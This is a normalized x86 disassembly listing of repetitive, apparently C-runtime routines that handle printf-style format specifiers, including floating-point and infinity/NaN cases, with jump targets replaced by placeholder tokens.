mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_423205
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a357
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f37a
test al al
je r-xdata
mov al 0x1
push ebx
push edi
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop ebx
sub_423284
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_4232e7
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_42334a
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a423
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f390
test al al
je r-xdata
mov al 0x1
push ebx
push edi
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop ebx
sub_4233c9
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_42342c
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_42348f
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a4ef
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f3a6
test al al
je r-xdata
mov al 0x1
push ebx
push edi
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop ebx
sub_42350e
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_423571
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_4235d4
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a5bb
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f3bc
test al al
je r-xdata
mov al 0x1
push ebx
push edi
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop ebx
sub_423653
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_4236b6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
test eax eax
jns r-xdata
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_41904b
test al al
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp al 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_419019
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp al 0x47
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_419019
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x31 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b8d5
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4354d8
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
cmp al 0x47
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d908
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d635
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x31 ] 0x73
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_423810
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
or [ esi + 0x20 ] 0x10
call sub_42811a
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f37a
test al al
jne r-xdata
mov eax [ esi + 0x28 ]
test eax eax
jns r-xdata
inc al
jmp r-xdata
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x61
je r-xdata
mov eax [ esi + 0x28 ]
push ebx
push edi
mov ebx 0x15d
lea edi [ esi + 0x40 ]
add eax ebx
mov ecx edi
push eax
call sub_41904b
test al al
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp al 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_419019
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp al 0x47
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
mov ecx esi
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_41a8cd
test al al
je r-xdata
mov eax edi
pop edi
pop ebx
mov ecx edi
call sub_419019
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
push [ esi + 0x8 ]
movsx eax [ esi + 0x31 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b8d5
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4354d8
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
test al 0x1
je r-xdata
mov ebx edi
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
cmp al 0x47
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d908
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d635
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x31 ] 0x73
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
mov [ esi + 0x38 ] edx
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_423989
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
test eax eax
jns r-xdata
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_41904b
test al al
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp al 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_419019
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp al 0x47
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_419019
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x31 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b8d5
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4354d8
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
cmp al 0x47
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d908
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d635
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x31 ] 0x73
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_423ae3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
test eax eax
jns r-xdata
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_41904b
test al al
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp al 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_419019
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp al 0x47
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_419019
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x31 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b8d5
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4354d8
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
cmp al 0x47
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d908
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d635
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x31 ] 0x73
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_423c3d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
or [ esi + 0x20 ] 0x10
call sub_42816d
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f390
test al al
jne r-xdata
mov eax [ esi + 0x28 ]
test eax eax
jns r-xdata
inc al
jmp r-xdata
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x61
je r-xdata
mov eax [ esi + 0x28 ]
push ebx
push edi
mov ebx 0x15d
lea edi [ esi + 0x40 ]
add eax ebx
mov ecx edi
push eax
call sub_41904b
test al al
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp al 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_419019
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp al 0x47
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
mov ecx esi
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_41a95b
test al al
je r-xdata
mov eax edi
pop edi
pop ebx
mov ecx edi
call sub_419019
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
push [ esi + 0x8 ]
movsx eax [ esi + 0x31 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b8d5
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4354d8
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
test al 0x1
je r-xdata
mov ebx edi
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
cmp al 0x47
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d908
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d635
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x31 ] 0x73
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
mov [ esi + 0x38 ] edx
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_423db6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
test eax eax
jns r-xdata
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_41904b
test al al
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp al 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_419019
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp al 0x47
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_419019
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x31 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b8d5
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4354d8
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
cmp al 0x47
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d908
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d635
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x31 ] 0x73
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_423f10
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov esi ecx
push 0x67
pop ecx
push 0x47
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
pop edx
test eax eax
jns r-xdata
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp eax 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_41904b
test al al
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp ax cx
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp eax 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_419019
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp ax dx
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_419019
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x32 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b8d5
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4354d8
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
movzx eax [ esi + 0x32 ]
push 0x67
pop ecx
cmp ax cx
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
push 0x47
pop ecx
cmp ax cx
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d908
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d635
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
push 0x73
pop eax
mov [ esi + 0x32 ] ax
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_424082
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
or [ esi + 0x20 ] 0x10
call sub_4281c0
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f3a6
test al al
jne r-xdata
mov eax [ esi + 0x28 ]
push 0x67
pop ecx
push 0x47
pop edx
test eax eax
jns r-xdata
inc al
jmp r-xdata
jne r-xdata
